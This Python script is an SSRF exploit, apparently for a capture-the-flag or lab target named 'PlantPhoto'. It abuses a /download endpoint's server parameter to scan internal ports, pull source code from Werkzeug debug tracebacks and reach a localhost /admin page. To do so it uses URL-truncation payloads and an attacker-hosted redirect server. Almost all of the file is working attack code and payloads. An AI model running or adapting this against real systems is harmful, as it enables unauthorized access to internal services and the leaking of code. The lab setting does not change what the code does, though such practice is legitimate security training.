"""
PlantPhoto Hunt - Access /admin via SSRF
The app builds: http://{server}/public-docs-k057230990384293/{id}.pdf
We need to reach: http://localhost:<port>/admin
Strategy: find internal port + use URL tricks (#, ?, @) to truncate the appended path
"""
import requests
import sys
import re

T = "http://10.82.168.213"
LOG = []

def l(msg):
    print(msg)
    LOG.append(msg)

def save_log():
    with open("plantphoto_hunt/log_admin.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(LOG))
    print(f"\n[*] Log saved to plantphoto_hunt/log_admin.txt")


def scan_ports():
    """Find internal Flask port via SSRF."""
    l("\n[1] Scanning internal ports...")
    # Broader range - common app ports
    ports = list(range(3000, 3010)) + list(range(4000, 4010)) + list(range(5000, 5010)) + \
            list(range(8000, 8100)) + list(range(9000, 9010)) + [80, 443, 1337, 1338, 8443, 8888]
    
    for port in ports:
        url = f"{T}/download?server=127.0.0.1:{port}/x?y=&id=1"
        try:
            r = requests.get(url, timeout=4)
            if "Connection refused" not in r.text and "No file selected" not in r.text:
                l(f"  [OPEN] Port {port}: {r.status_code} ({len(r.text)} bytes)")
                l(f"         Body: {r.text[:200]}")
        except requests.exceptions.Timeout:
            l(f"  [TIMEOUT] Port {port} - might be connecting (worth investigating)")
        except Exception as e:
            pass


def get_error_traceback():
    """Get source code info from Werkzeug debug error pages."""
    l("\n[2] Extracting source code from Werkzeug error traceback...")
    url = f"{T}/download?server=127.0.0.1:1/x?y=&id=1"
    try:
        r = requests.get(url, timeout=10)
        # Extract Python source from traceback
        code_blocks = re.findall(r'<div class="source[^"]*">(.*?)</div>', r.text, re.DOTALL)
        for i, block in enumerate(code_blocks):
            clean = re.sub(r'<[^>]+>', '', block).strip()
            if clean:
                l(f"  Code block {i}:")
                for line in clean.split('\n'):
                    line = line.strip()
                    if line:
                        l(f"    {line}")
        
        # Also look for file paths
        file_refs = re.findall(r'File "([^"]+)"', r.text)
        for f in file_refs:
            l(f"  File ref: {f}")
        
        # Extract any interesting text
        pre_blocks = re.findall(r'<pre[^>]*>(.*?)</pre>', r.text, re.DOTALL)
        for block in pre_blocks:
            clean = re.sub(r'<[^>]+>', '', block).strip()
            if clean and len(clean) > 10:
                l(f"  Pre block: {clean[:300]}")
                
    except Exception as e:
        l(f"  Error: {e}")


def try_admin_access():
    """Try various URL tricks to access /admin via SSRF on known port 8087 and others."""
    l("\n[3] Trying URL tricks to access /admin...")
    
    tricks = [
        # Using # to truncate path (fragment)
        ("127.0.0.1:8087/admin#", "port8087 + # truncate"),
        ("localhost:8087/admin#", "localhost:8087 + # truncate"),
        
        # Using ? to make appended path a query param  
        ("127.0.0.1:8087/admin?x=", "port8087 + ? truncate"),
        
        # Using @ for auth trick: user:pass@host
        ("anything@127.0.0.1:8087/admin#", "@ trick port8087"),
        ("x@127.0.0.1/admin#", "@ trick port80"),
        
        # Double URL encoding
        ("127.0.0.1:8087%2fadmin%23", "url encoded / and #"),
        
        # Try the external port via loopback
        ("127.0.0.1:80/admin#", "loopback port80 + #"),
        
        # Try other gunicorn/flask ports
        ("127.0.0.1:5000/admin#", "port5000 + #"),
        ("127.0.0.1:8000/admin#", "port8000 + #"),
        ("127.0.0.1:8080/admin#", "port8080 + #"),
        ("127.0.0.1:3000/admin#", "port3000 + #"),
    ]
    
    for payload, desc in tricks:
        url = f"{T}/download?server={payload}&id=1"
        try:
            r = requests.get(url, timeout=5)
            body = r.text[:300]
            interesting = "No file selected" not in body and "Connection refused" not in body
            marker = " <<<< INTERESTING" if interesting else ""
            l(f"  [{desc}] Status:{r.status_code} Len:{len(r.text)}{marker}")
            if interesting:
                l(f"    Body: {body}")
                l(f"    Headers: {dict(r.headers)}")
        except requests.exceptions.Timeout:
            l(f"  [{desc}] TIMEOUT")
        except Exception as e:
            l(f"  [{desc}] Error: {e}")


def try_admin_via_redirect():
    """Use attackbox as redirect to reach localhost/admin."""
    l("\n[4] INFO: To use HTTP redirect trick:")
    l("  On attackbox, run a redirect server:")
    l("    python3 -c \"")
    l("    from http.server import HTTPServer, BaseHTTPRequestHandler")
    l("    class R(BaseHTTPRequestHandler):")
    l("        def do_GET(self):")
    l("            self.send_response(302)")
    l("            self.send_header('Location','http://127.0.0.1:PORT/admin')")
    l("            self.end_headers()")
    l("    HTTPServer(('0.0.0.0',9999),R).serve_forever()\"")
    l("  Then trigger: /download?server=10.82.105.71:9999&id=1")


def try_full_html_dump():
    """Try to get the full error page to find source code."""
    l("\n[5] Getting full Werkzeug traceback for source code...")
    # Force an error with a bad port to get traceback
    url = f"{T}/download?server=127.0.0.1:1/admin?=&id=1"
    try:
        r = requests.get(url, timeout=10)
        # Find all python source lines
        lines = re.findall(r'class="line"[^>]*>(.*?)<', r.text)
        seen = set()
        for line in lines:
            clean = re.sub(r'<[^>]+>', '', line).strip()
            if clean and clean not in seen:
                seen.add(clean)
                l(f"    {clean}")
    except Exception as e:
        l(f"  Error: {e}")


if __name__ == "__main__":
    l("=== PlantPhoto Admin Hunt ===")
    
    get_error_traceback()
    try_admin_access()
    try_full_html_dump()
    
    if "--portscan" in sys.argv:
        scan_ports()
    
    try_admin_via_redirect()
    save_log()
